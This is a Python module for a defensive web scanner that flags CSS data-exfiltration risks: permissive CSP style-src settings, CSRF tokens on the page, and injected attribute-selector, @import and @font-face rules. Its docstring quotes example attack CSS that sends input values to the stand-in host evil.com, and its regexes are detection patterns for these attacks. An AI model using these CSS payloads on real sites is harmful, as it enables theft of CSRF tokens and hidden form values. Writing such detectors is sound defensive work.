"""
CSS Data Exfiltration Scanner.

CSS attribute selectors can be used to exfiltrate sensitive page content
byte-by-byte to an attacker-controlled server without JavaScript. This works
when an attacker can inject CSS into a page (via CSS injection vulnerability).

Attack patterns:

1. CSS attribute selector exfiltration:
   `input[value^="a"] { background: url("https://evil.com/leak?c=a") }`
   Leaks CSRF token or hidden field values character by character.

2. CSS @import chain:
   Chaining @import allows exfiltrating multiple bytes per page load.

3. CSS font-face with remote sources:
   `@font-face { src: url("https://evil.com/font?q=...") }`
   Font loading requests can carry encoded data.

4. CSS counter-style attacks (newer CSS feature).

5. Missing style-src CSP allowing CSS injection.

Detection approach (passive/defensive):
- Check if CSP restricts style-src to prevent external CSS injection.
- Check if CSP prevents arbitrary URL loads (style-src without 'unsafe-inline').
- Detect `style-src *` or missing `style-src` (default-src fallback).
- Detect presence of `<style>` with attribute-selector + url() combos (injection artifacts).
- Detect @import from external URLs in inline CSS.
- Check if hidden form fields (CSRF tokens) are present alongside permissive style-src.

CWE-79: Cross-site Scripting (via CSS injection vector)
CWE-200: Exposure of Sensitive Information
"""

import re
from typing import Any, Dict, List

from tblue.scanner.base import BaseScanner
from tblue.logger import get_logger, log_pass, log_warn, log_fail

logger = get_logger(__name__)

_STYLE_BLOCK_RE = re.compile(r'<style\b[^>]*>(.*?)</style>', re.I | re.S)
_IMPORT_EXT_RE  = re.compile(r'@import\s+(?:url\s*\()?["\']?(https?://[^"\')\s]+)', re.I)
_ATTR_SEL_URL_RE = re.compile(
    r'\[(?:value|name|data-[^\]]+)\s*[\^$*~|]?=\s*["\'][^"\']*["\'][^}]*'
    r'url\s*\(\s*["\']?https?://',
    re.I | re.S
)
_FONT_FACE_EXT_RE = re.compile(
    r'@font-face\s*\{[^}]*src\s*:[^}]*url\s*\(\s*["\']?https?://',
    re.I | re.S
)
_STYLE_SRC_RE    = re.compile(r'style-src\s*([^;]+?)(?:;|$)', re.I)
_CSRF_FIELD_RE   = re.compile(
    r'<input\b[^>]+(?:name|id)\s*=\s*["\'](?:csrf|_token|authenticity_token|'
    r'__RequestVerificationToken|csrfmiddlewaretoken)["\']',
    re.I
)
_LINK_CSS_EXT_RE = re.compile(
    r'<link\b[^>]*\brel\s*=\s*["\']stylesheet["\'][^>]*\bhref\s*=\s*["\']'
    r'(https?://(?!(?:fonts\.googleapis\.com|fonts\.gstatic\.com))[^"\']+)["\']',
    re.I
)


class CSSExfiltrationScanner(BaseScanner):
    """Detect CSS injection / exfiltration attack surface."""

    def scan(self, url: str) -> List[Dict[str, Any]]:
        self.results = []
        findings = 0

        try:
            resp = self.http.get(url)
        except Exception:
            return self.results

        if resp is None:
            self.results.append(self._result(
                url, "CSS exfiltration — no response", "PASS",
                detail="Target did not respond."
            ))
            return self.results

        body = resp.text or ""
        raw_headers = resp.headers if hasattr(resp.headers, "items") else {}
        headers = {k.lower(): v for k, v in (raw_headers.items() if hasattr(raw_headers, "items") else raw_headers)}

        csp = headers.get("content-security-policy", "")

        # Check style-src in CSP
        style_src_m = _STYLE_SRC_RE.search(csp) if csp else None
        has_unsafe_inline_style = "unsafe-inline" in (style_src_m.group(1) if style_src_m else csp)
        style_src_wildcard = "*" in (style_src_m.group(1) if style_src_m else "")
        has_csrf = bool(_CSRF_FIELD_RE.search(body))

        if not csp:
            if has_csrf:
                log_warn(logger, f"No CSP (no style-src) with CSRF tokens at {url}")
                self.results.append(self._result(
                    url,
                    "CSS exfiltration — no CSP style-src restriction with CSRF tokens on page",
                    "WARN",
                    detail=(
                        "Page contains CSRF tokens (or similar secret form fields) and has no "
                        "Content-Security-Policy to restrict CSS injection. If an attacker can "
                        "inject CSS (via CSS injection vuln, stored XSS, or CSS-in-JS), they "
                        "can exfiltrate CSRF token values byte-by-byte via attribute selectors "
                        "and background-url requests. "
                        "Fix: add style-src 'self' and remove 'unsafe-inline' from CSP."
                    )
                ))
                findings += 1
        elif has_unsafe_inline_style and has_csrf:
            log_warn(logger, f"unsafe-inline in style-src with CSRF tokens at {url}")
            self.results.append(self._result(
                url,
                "CSS exfiltration — CSP style-src allows unsafe-inline with CSRF tokens present",
                "WARN",
                detail=(
                    "CSP permits inline styles (unsafe-inline in style-src) and the page "
                    "contains CSRF tokens or secret form values. Inline CSS injection can "
                    "be used to exfiltrate these values via CSS attribute selectors. "
                    "Fix: remove 'unsafe-inline' from style-src; use nonces/hashes for inline styles."
                )
            ))
            findings += 1
        elif style_src_wildcard:
            log_warn(logger, f"style-src wildcard in CSP at {url}")
            self.results.append(self._result(
                url,
                "CSS exfiltration — CSP style-src is wildcard (*), external CSS injection allowed",
                "WARN",
                detail=(
                    "CSP style-src is set to '*', allowing CSS to be loaded from any origin. "
                    "This enables exfiltration via external CSS @import or attribute-selector "
                    "url() fetch requests. Fix: restrict style-src to specific trusted origins."
                )
            ))
            findings += 1

        # Scan inline <style> blocks for injection artifacts
        for style_content in _STYLE_BLOCK_RE.findall(body):
            if findings >= 8:
                break

            if _ATTR_SEL_URL_RE.search(style_content):
                log_fail(logger, f"CSS attribute selector + external URL in style block at {url}")
                self.results.append(self._result(
                    url,
                    "CSS exfiltration — attribute selector with external URL() in inline style",
                    "FAIL",
                    detail=(
                        "A <style> block contains CSS attribute selectors combined with "
                        "external url() references. This is a classic CSS exfiltration "
                        "pattern used to leak secret values (CSRF tokens, hidden fields) "
                        "by making network requests based on attribute values. "
                        "Fix: investigate possible CSS injection; remove user-controlled "
                        "content from style blocks."
                    )
                ))
                findings += 1

            if _IMPORT_EXT_RE.search(style_content):
                ext_url = _IMPORT_EXT_RE.search(style_content).group(1)
                log_warn(logger, f"CSS @import of external URL in style block at {url}")
                self.results.append(self._result(
                    url,
                    f"CSS exfiltration — @import of external URL in inline style: {ext_url[:60]}",
                    "WARN",
                    detail=(
                        f"A <style> block imports an external CSS file: @import url('{ext_url[:80]}'). "
                        "External @import chains can load attacker-controlled CSS if the "
                        "imported URL is manipulated. "
                        "Fix: avoid @import in inline styles; load stylesheets via <link> tags "
                        "with SRI integrity attributes."
                    )
                ))
                findings += 1

            if _FONT_FACE_EXT_RE.search(style_content):
                log_warn(logger, f"CSS @font-face with external URL in style block at {url}")
                self.results.append(self._result(
                    url,
                    "CSS exfiltration — @font-face with external URL in inline style",
                    "WARN",
                    detail=(
                        "A <style> block defines a @font-face with an external src: URL. "
                        "Font loading requests can be used to exfiltrate encoded data or "
                        "confirm rendering context to a remote server. "
                        "Fix: host fonts on the same origin; restrict font-src in CSP."
                    )
                ))
                findings += 1

        # Check for external non-standard CSS includes
        for ext_css in _LINK_CSS_EXT_RE.findall(body):
            if findings >= 8:
                break
            log_warn(logger, f"External stylesheet (non-standard CDN) at {url}: {ext_css[:60]}")
            self.results.append(self._result(
                url,
                f"CSS exfiltration — external stylesheet without SRI: {ext_css[:60]}",
                "WARN",
                detail=(
                    f"External stylesheet '{ext_css[:80]}' loaded without SRI integrity. "
                    "If this stylesheet is compromised, an attacker can inject CSS exfiltration "
                    "rules into it. Fix: add integrity='sha384-...' and crossorigin='anonymous' "
                    "to the <link rel='stylesheet'> tag."
                )
            ))
            findings += 1

        if not self.results:
            log_pass(logger, f"No CSS exfiltration indicators at {url}")
            self.results.append(self._result(
                url, "CSS exfiltration — no CSS exfiltration indicators detected", "PASS",
                detail="No unsafe style-src, external @import, or attribute selector exfiltration patterns found."
            ))

        return self.results
